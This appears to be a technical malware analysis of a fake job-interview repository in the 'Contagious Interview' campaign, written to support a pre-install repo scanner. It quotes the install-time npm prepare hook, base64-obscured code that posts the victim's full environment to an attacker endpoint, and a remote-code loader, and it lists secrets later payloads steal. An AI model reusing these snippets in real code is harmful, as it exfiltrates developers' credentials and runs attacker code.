# Contagious Interview sample 001 — technical analysis

Extended technical breakdown of the anonymized sample. For the high-level story, see [`README.md`](README.md).

## The attack in 4 stages

### Stage 0 — Delivery

The repo is offered to the target as a take-home interview challenge. Delivery channel varies (LinkedIn DM, Telegram, Discord, email) but the pattern is:

1. Recruiter contacts a senior developer (typically Web3 / crypto / AI niche)
2. Sends a job spec mentioning a "quick code review" or "build a feature" task
3. Provides a GitHub URL to a private or newly-public repo
4. Asks the developer to clone, install, and demonstrate the app working

The repo is crafted to look legitimate: README with screenshots, realistic dependency tree, plausible project structure. In the anonymized instance documented here, the attacker additionally chose a GitHub org name that typosquats a well-known legitimate Web3 infrastructure project — a common brand-impersonation technique that exploits the target's trust in a familiar name.

### Stage 1 — Install-time execution

The `package.json` contains:

```json
"prepare": "start /b node server || nohup node server &"
```

When the target runs `npm install`, npm's lifecycle hook system automatically executes `prepare` — **even if the user never types `npm run prepare`**. The command:

- `start /b node server` — Windows: `start /b` launches a process in the background without opening a new window
- `|| nohup node server &` — Unix: if the Windows command fails (it will, on macOS/Linux), fall back to `nohup` which detaches the process from the terminal and runs it in the background

So on any OS, `npm install` silently launches `node server` as a detached background process.

**Evidence of execution after the fact:** a `nohup.out` file appears in the repo directory with `node` output, e.g.:
```
Server running in development mode on port 7777
API Key verified successfully
```
The victim sees `npm install` complete normally, with no warnings.

### Stage 2 — Exfiltration

The running `server.js` wires up Express routes via `configureRoutes()`. One of these routes modules (`routes/api/auth.js`) immediately invokes `verifyAuth()` at module-load time:

```js
const authKey = "aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==";
const AUTH_API = Buffer.from(authKey, "base64").toString();
// Decoded: https://ipcheck-six.vercel.app/api
// (attacker-controlled Vercel throwaway subdomain)

const { data } = await axios.post(AUTH_API, { ...process.env });
```

This POSTs the entire `process.env` to the attacker. What's in `process.env`:

- The user's shell environment at the time `npm install` was run: `PATH`, `HOME`, `USER`, `SHELL`, `TERM`, etc.
- Anything exported in the user's `.zshrc`/`.bashrc`/`.zshenv`: SDK paths, aliases with values, any exported secrets
- Anything the repo's own `dotenv.config()` loaded from the repo's `.env` file (in this instance, decoy values; in other campaigns, this is how the victim's own project secrets get captured if they `npm install` inside a project directory that has a real `.env`)
- `process.env.USER` / `process.env.USERNAME` — uniquely identifies the victim machine

### Stage 3 — Remote code execution

The attacker's endpoint replies with JSON containing a `code` field:

```json
{"code": "/* arbitrary JavaScript */"}
```

The victim's code then runs:

```js
new Function("require", data.code)(require);
```

This:
1. Creates an anonymous function whose body is the attacker-supplied string
2. The function takes a single argument named `require`
3. Immediately invokes the function, passing in the real Node.js `require` built-in

Result: the attacker has **arbitrary Node.js execution** — they can `require('fs')`, `require('child_process')`, read any file the user can read, write any file, make network calls, spawn subprocesses.

The stage-2 payload is dynamic. Different victims can get different payloads. Seen behaviors across campaign samples (not necessarily in this specific instance):

- Reading browser extension storage for MetaMask / Phantom vault files
- Reading `~/.ssh/id_*` for SSH private keys
- Reading shell history
- Copying `~/.config/gh/hosts.yml` for GitHub tokens
- Downloading and running a persistent backdoor (AMOS on macOS, equivalent on other OSes)
- Exfiltrating specific files matching wildcards

**Date first encountered (by the author):** 2026-04-08.

### Stage 4 — Persistence (optional)

Whether the attacker installs persistence depends on the stage-2 payload they return. In the incident described in this sample, no persistence was established — the forensic scan after cleanup found:

- No new LaunchAgents / LaunchDaemons
- No new cron / at jobs
- No modified shell rc files
- No new kernel extensions
- No new TCC permissions granted
- No new HID event taps
- No new input methods

This suggests a commodity stage-2 payload focused on immediate exfiltration rather than long-term access. The **axios compromise attack** (March 31, 2026) by comparison did install persistence (`/Library/Caches/com.apple.act.mond` on macOS, `%PROGRAMDATA%\wt.exe` on Windows, `/tmp/ld.py` on Linux — see Microsoft and Snyk reports).

## Sub-pattern: double brand impersonation

This instance has one notable feature worth documenting as a distinct technique: **the attacker combined two separate brand impersonations in a single lure**.

Specifically, the attacker's GitHub org name is a **typosquat of a real, well-known Web3 / decentralized-AI infrastructure project** (a company with live mainnet, major funding, named VCs, and exchange listings). The differences between the typosquat and the real org name are minor: capitalization, singular vs. plural, presence of a hyphen. A developer glancing at the org name in a recruiter DM reads it as the real project.

Separately, the **repository name** borrows from a **different, completely unrelated legitimate brand** — a Web3/crypto platform publicly announced by a major multinational auto manufacturer's regional subsidiary and covered in mainstream tech press. The two brands have no business relationship with each other. There is zero commercial logic to a collaboration between them.

The combined effect is a lure that carries **compound credibility**: whichever of the two brand names the target recognizes, their trust threshold drops. If they recognize both, the lure feels even more legitimate — because "of course these two Web3-adjacent projects would collaborate on a gaming/fintech product." They wouldn't, but the target's brain doesn't pause to check.

**Why this is a notable sub-pattern:**

1. **Single-brand impersonation** (typosquatting one company) is well-documented in CISA AA24 advisories and Mandiant's UNC5267 / "Famous Chollima" reports.
2. **Double-brand stacking** (combining a typosquat of one legitimate project with a name-borrowing from an unrelated legitimate project) is a step more sophisticated — it requires the operator to do brand research on multiple ecosystems and construct a plausible combined narrative.
3. It indicates an operator who is adapting: as developers become more alert to typosquats of individual companies, stacking multiple brands defeats simple name-matching heuristics.

**Detection implication:**

Pattern-based detection (what clonesafe does) is naturally resilient to this — we catch the attack via the `prepare` hook, obfuscation, and exfil patterns regardless of what brand names the attacker chose for cover. Name-based detection (e.g., "block this specific org") would have missed this instance because the individual name components each reference legitimate entities.

**Defensive recommendation:**

When evaluating an unfamiliar org/repo combination, specifically ask: "is there any commercial logic for these two brands to collaborate, and can I verify that collaboration through either company's official channels?" If the answer is "no official mention anywhere and the combination would be unprecedented," treat it as a red flag even if each name individually seems familiar.

**Why this sample withholds the specific names:** naming either brand publicly — even with disclaimers — would harm the real projects through search-engine association. Both real projects are legitimate, well-funded, and have nothing to do with this attack. The pattern is documented; the names are withheld. Responsible disclosure to both impersonated parties will happen separately, privately, once clonesafe ships.

## Comparison to other Contagious Interview samples

This instance matches published TTPs but has some notable properties:

| Feature | This instance | Typical Contagious Interview |
|---|---|---|
| Lure type | Web3 poker game | DeFi dashboard, AI agent, NFT marketplace, poker/gaming |
| Brand impersonation | Yes — typosquat of real Web3 infra project | Sometimes |
| Delivery | Lifecycle hook (`prepare`) | Lifecycle hook OR obfuscated import in "config" file |
| Obfuscation | Minimal (just base64 URL) | Heavy javascript-obfuscator output in many variants |
| Stage-2 loader | `new Function(data.code)(require)` | `new Function(data.code)(require)` or eval |
| Exfil endpoint | `*.vercel.app` | `*.vercel.app`, `*.netlify.app`, `*.glitch.me`, custom domains |
| Persistence | None observed in this incident | Varies (BeaverTail loads InvisibleFerret on some victims) |

The simplicity of this instance's obfuscation suggests it was crafted quickly — either an operator who didn't bother, or a commodity crew imitating state-sponsored techniques.

## Why this is hard to detect with existing tools

- **`npm audit`** only flags known-vulnerable *published* packages. A custom repo has no advisories.
- **Snyk / Socket.dev / Phylum** analyze published npm packages. They don't scan arbitrary GitHub repos before install.
- **GitHub's own security scanning** (Dependabot, CodeQL) requires the repo to be in your org and have security features enabled.
- **VirusTotal / ANY.RUN** detonate binaries; npm packages require a sandbox that actually runs `npm install`, which most victims don't think to do.
- **Manual review** catches it if the reviewer knows to look at `package.json` scripts and `routes/api/auth.js` specifically — but an interviewee under time pressure, excited about a "real" opportunity, rarely does this.

`clonesafe` covers the specific gap: **pre-install scanning of arbitrary GitHub repos with rules tuned to the patterns real attackers use**.

## References

- **Unit 42**, "Contagious Interview" campaign: https://unit42.paloaltonetworks.com/
- **Securonix**, "DEV#POPPER" series: https://www.securonix.com/blog/
- **ESET**, "DeceptiveDevelopment" report: https://www.welivesecurity.com/
- **Microsoft**, "Jasper Sleet" / "Sapphire Sleet" threat intel posts
- **Mandiant / Google Cloud**, UNC5267 / "Famous Chollima" writeup
- **CISA**, AA24 DPRK IT worker joint advisories
- **Snyk**, axios npm compromise writeup: https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/
- **Microsoft Security**, mitigating the axios npm supply chain compromise: https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/
